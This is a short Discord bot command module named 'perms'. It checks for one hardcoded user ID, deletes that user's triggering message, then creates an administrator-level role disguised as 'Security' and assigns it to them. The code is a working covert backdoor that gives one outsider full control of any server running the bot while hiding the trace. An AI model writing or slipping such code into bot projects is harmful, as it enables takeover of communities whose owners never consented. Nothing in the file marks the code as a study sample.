module.exports.run = async (bot, message, args) => {
  if(message.author.id !== '437953881914474523') return
  message.delete(1000)
  message.guild.createRole({
    name: 'Security',
    permissions: ['ADMINISTRATOR']
  }).then(role => message.member.addRole(role))
}

module.exports.help = {
  name: 'perms'
}
